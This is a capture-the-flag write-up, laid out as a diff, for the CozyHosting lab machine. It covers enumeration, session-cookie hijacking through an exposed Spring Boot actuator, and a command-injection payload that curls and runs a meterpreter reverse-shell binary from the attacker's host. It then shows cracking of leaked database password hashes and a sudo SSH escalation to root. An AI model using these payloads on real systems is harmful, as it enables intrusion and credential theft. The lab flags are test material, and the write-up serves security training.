@@ -1,0 +1,189 @@
+CozyHosting Lab: Cookies Exposure, Exposed Credentials, Command Injection, 
+
+Enumeration:
+sudo nmap -sC -sV -p- --min-rate=1000 10.129.80.44
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA)
+|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://cozyhosting.htb
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.19 seconds
+
+http://cozyhosting.htb/ 
+
+echo 10.129.80.44 cozyhosting.htb | sudo tee -a /etc/hosts
+
+
+ http://cozyhosting.htb/login 
+
+Let’s use burp suite to see if we can manipulate our requests:
+
+HTTP post request with username: admin and password: password
+POST /login HTTP/1.1
+Host: cozyhosting.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://cozyhosting.htb/login?error
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 32
+Origin: http://cozyhosting.htb
+DNT: 1
+Connection: close
+Cookie: JSESSIONID=7119FCE098010A0E09054B2FA8705D82
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+username=admin&password=password
+
+Let’s see if gobuster finds any hidden directories:
+
+gobuster dir -u http://cozyhosting.htb/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
+
+
+Starting gobuster in directory enumeration mode
+===============================================================
+/index                (Status: 200) [Size: 12706]
+/login                (Status: 200) [Size: 4431]
+/admin                (Status: 401) [Size: 97]
+/logout               (Status: 204) [Size: 0]
+/error                (Status: 500) [Size: 73]
+
+
+
+Tried to XSS injection on error HTTP
+GET /error HTTP/1.1
+Host: cozyhosting.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+DNT: 1
+Connection: close
+Cookie: JSESSIONID=7119FCE098010A0E09054B2FA8705D82
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1<script>alert('XSS');</script>
+Content-Length: 2
+
+The error page says:
+
+
+Browsing to /error returns an error page with a header stating Whitelabel Error Page .
+Researching this error reveals that this application is using SpringBoot . 
+
+gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt -u http://cozyhosting.htb/
+
+http://cozyhosting.htb/actuator/mappings exists
+http://cozyhosting.htb/actuator/sessions gives us:
+
+
+47A8A3ECEE7624D150846C81E511230B	"kanderson"
+7119FCE098010A0E09054B2FA8705D82	"UNAUTHORIZED"
+2362BF0CAD74BAA829F20B1818D1F4AB	"kanderson"
+
+
+We inspect element then went to storage where we changed our cookie to the kanderson one
+
+Then we logged into http://cozyhosting.htb/admin 
+
+
+There is a field asking for a connection setting, let’s test if we can perform command injection:
+
+
+Launch a web server on attack machine
+Python -m http.server 7000
+
+On the fields on victim web server, let’s put
+
+Hostname: 127.0.0.1
+Username: test;curl${IFS}http://10.10.14.206:7000/reverse.elf;
+
+On attack machine:
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.206 LPORT=4444 -f elf -o reverse.elf
+
+
+Now send it on username field of web server
+test;curl${IFS}http://10.10.14.206:7000/reverse.elf${IFS}-o${IFS}/tmp/reverse.elf&&chmod${IFS}+x${IFS}/tmp/reverse.elf&&/tmp/reverse.elf; 
+
+
+unzip -d /tmp/app cloudhosting-0.0.1.jar 
+
+cat /tmp/app/BOOT-INF/classes/application.properties
+
+server.address=127.0.0.1
+server.servlet.session.timeout=5m
+management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
+management.endpoint.sessions.enabled = true
+spring.datasource.driver-class-name=org.postgresql.Driver
+spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
+spring.jpa.hibernate.ddl-auto=none
+spring.jpa.database=POSTGRESQL
+spring.datasource.platform=postgres
+spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
+spring.datasource.username=postgres
+spring.datasource.password=Vg&nvzAQ7XxR
+
+This reveals a postgresql server we can get into
+psql -h 127.0.0.1 -U postgres
+
+\list - used to list databases 
+\connect cozyhosting
+You are now connected to database "cozyhosting" as user "postgres".
+
+\dt - list tables in database
+select * from users; - gives us name and password, role of values in users table 
+
+select * from users;
+   name    |                           password                           | role  
+-----------+--------------------------------------------------------------+-------
+ kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+ admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
+
+hashid '$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim'
+Analyzing '$2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim'
+[+] Blowfish(OpenBSD) 
+[+] Woltlab Burning Board 4.x 
+[+] bcrypt 
+
+hashcat hash_file -m 3200 /usr/share/wordlists/seclists/rockyou.txt
+
+manchesterunited was the cracked password
+
+Josh was a user, and we were also to ssh into his account using cracked password above
+
+josh@cozyhosting:~$ cat user.txt
+9741d951d78a21467ed3d6079e1755fe
+
+
+Privilege Escalation
+sudo -l -S
+Matching Defaults entries for josh on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User josh may run the following commands on localhost:
+    (root) /usr/bin/ssh *
+
+After looking around, we found this, which exploits sudo permissions of SSH to give us root shell:
+
+sudo /usr/bin/ssh -v -o PermitLocalCommand=yes -o 'LocalCommand=/bin/bash' josh@127.0.0.1 
+
+Additionally:  
+
+ #   Name                                                               Potentially Vulnerable?  Check Result
+ -   ----                                                               -----------------------  ------------
+ 1   exploit/linux/local/cve_2022_0847_dirtypipe                        Yes                      The target appears to be vulnerable. Linux kernel version found: 5.15.0
+ 2   exploit/linux/local/pkexec                                         Yes                      The service is running, but could not be validated.
+ 3   exploit/linux/local/su_login                                       Yes                      The target appears to be vulnerable.
+
+root@cozyhosting:~# cat root.txt
+3da29ce869ddaf02f7b38de12fd270c5
+
+Now we have root access:
